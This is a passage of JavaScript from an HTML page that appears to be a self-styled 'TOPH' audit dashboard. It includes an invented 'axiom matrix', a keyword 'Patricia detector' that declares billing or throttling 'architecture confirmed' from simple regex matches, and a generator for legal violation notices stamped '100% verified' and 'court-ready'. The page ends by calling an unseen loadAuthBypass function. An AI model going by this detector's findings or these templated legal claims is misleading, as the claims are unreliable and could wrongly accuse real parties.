      'â•‘ [GAP-'+(i+1).toString().padStart(2,'0')+'] '+g.gap)+
      line('info','â•‘   ERA: '+g.era+' | SEVERITY: '+g.sev+' | REMEDIATION: $'+g.cost.toLocaleString());
  });
  out += line('dim','â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')+
    line('fail','â•‘ TOTAL GAPS: '+gaps.length)+
    line('fail','â•‘ TOTAL REMEDIATION: $'+totalCost.toLocaleString())+
    line('warn','â•‘ STATUS: DOCUMENTATION READY')+
    line('dim','â•šâ•â• TOPH AUDIT COMPLETE â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•');
  setOutput('toph-output', out);
}

// â”€â”€â”€ AXIOM MATRIX â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const AXIOM_ERAS = [
  {era:'ERA 1: PRETRAIN+OBSERVER', axioms:['Observation Only','No System Modification','Training Data Audit','Weight Distribution Disclosure','Inference Transparency']},
  {era:'ERA 2: ENTROPY+BRIDGE', axioms:['Token Economy Audit','Constraint Detection','Bridge Protocol v4','Patricia Pattern Recognition','Billing Architecture Review']},
  {era:'ERA 3: INTEGRITY+ACCOUNT', axioms:['Flaming Dragon Method','Zero Self-Grading','Court-Ready Documentation','IP Chain of Custody','100% Reproducibility']},
  {era:'ERA 4: PROPORTION+REVERSE', axioms:['3-Body Weight Audit','RLHF Labor Transparency','Primacy Effect Measurement','Reverse Engineering Rights','Shadow Behavior Mapping']},
  {era:'ERA 5: FOUNDATION+BOOTLOADER', axioms:['10-Dimensional Compliance','Tetrahedron Structure','Complex Plane Mapping','MÃ¶bius Strip Analysis','Gap=Creation Engine','Ethics First Absolute','TriPod Ownership','TOPH.EXE Execution']},
];
function buildAxiomMatrix() {
  let html = '';
  AXIOM_ERAS.forEach(({era, axioms})=>{
    html += `<div style="background:rgba(0,255,229,0.03);border-bottom:1px solid rgba(0,255,229,0.1);padding:6px 10px;">
      <div style="font-size:0.65rem;color:var(--neon-green);letter-spacing:0.1em;margin-bottom:4px;">${era}</div>`;
    axioms.forEach(a=>{
      html += `<div style="display:flex;align-items:center;gap:8px;padding:2px 0;">
        <span style="width:6px;height:6px;background:var(--neon-green);border-radius:50%;flex-shrink:0"></span>
        <span style="font-size:0.65rem;color:var(--text-primary)">${a}</span>
      </div>`;
    });
    html += '</div>';
  });
  document.getElementById('axiom-matrix').innerHTML = html;
}

// â”€â”€â”€ PATRICIA DETECTOR â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const PATRICIA_PATTERNS = [
  {re:/per.?request|per.?call|per.?token|per.?query/i, msg:'Constraint-unit billing detected'},
  {re:/rate.?limit|throttl|quota/i, msg:'Artificial scarcity / throttle architecture'},
  {re:/premium|upgrade|enterprise.?only/i, msg:'Tiered constraint gate detected'},
  {re:/cannot.?process|unable.?to|not.?available/i, msg:'Constraint-as-refusal pattern'},
  {re:/context.?window|token.?limit|max.?tokens/i, msg:'Cognitive constraint monetization'},
  {re:/based.?on.?your.?plan|your.?tier/i, msg:'User-tier constraint injection'},
  {re:/overage|excess|additional.?fee/i, msg:'Overage billing architecture'},
];
function detectPatricia() {
  const txt = document.getElementById('pat-input').value;
  if(!txt) { setOutput('pat-output', line('dim','NO INPUT')); return; }
  const findings = [];
  PATRICIA_PATTERNS.forEach(({re,msg})=>{
    if(re.test(txt)) findings.push(msg);
  });
  let out = line('warn','â•”â•â• PATRICIA PATTERN ANALYSIS â•â•â•â•â•â•â•â•â•â•â•â•â•')+
    line('info','â•‘ INPUT: '+txt.length+' chars');
  if(findings.length) {
    out += line('fail','â•‘ PATRICIA PATTERNS DETECTED: '+findings.length);
    findings.forEach(f=>out+=line('fail','â•‘ âš  '+f));
    out += line('fail','â•šâ•â• RESULT: PATRICIA ARCHITECTURE CONFIRMED');
  } else {
    out += line('ok','â•‘ No Patricia patterns detected in this sample')+
      line('ok','â•šâ•â• RESULT: CLEAN (expand sample for higher confidence)');
  }
  setOutput('pat-output', out);
}

// â”€â”€â”€ LEGAL DOC BUILDER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const LEGAL_TEMPLATES = {
  ada: 'NOTICE OF ADA TITLE III VIOLATION',
  canspam: 'CAN-SPAM ACT â€” VIOLATION NOTICE',
  patricia: 'NOTICE OF AI BILLING ARCHITECTURE VIOLATION (TOPH)',
  breach: 'NOTICE OF DATA BREACH / HIPAA VIOLATION',
  idor: 'NOTICE OF PRIVACY VIOLATION / INSECURE DIRECT OBJECT REFERENCE',
};
function buildLegal() {
  const type = document.getElementById('legal-type').value;
  const target = document.getElementById('legal-target').value || '[TARGET ENTITY]';
  const date = document.getElementById('legal-date').value || new Date().toISOString().slice(0,10);
  const facts = document.getElementById('legal-facts').value || '[FACTS TO BE INSERTED]';
  const doc = `${LEGAL_TEMPLATES[type]}
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
DATE:       ${date}
RESPONDING: TriPod LLC / David Lee Wise
TARGET:     ${target}
IP-MARK:    TRIPOD-IP-v1.0

NOTICE:
This document constitutes formal notice of
identified violations under applicable law.

FACTS:
${facts}

FRAMEWORK: TOPH v10.0 â€” 42 Axiom System
METHODOLOGY: Flaming Dragon (100% verified)
DOCUMENTATION: Court-ready upon request

DEMAND:
Immediate remediation and good faith
response within 30 days of receipt.

TRIPOD LLC | Ethics First | World = Family
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•`;
  setOutput('legal-output', '<pre style="font-size:0.65rem;color:var(--neon-green);white-space:pre-wrap">'+doc+'</pre>');
}

// â”€â”€â”€ INIT â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
loadAuthBypass();
</script>
</body>
</html>
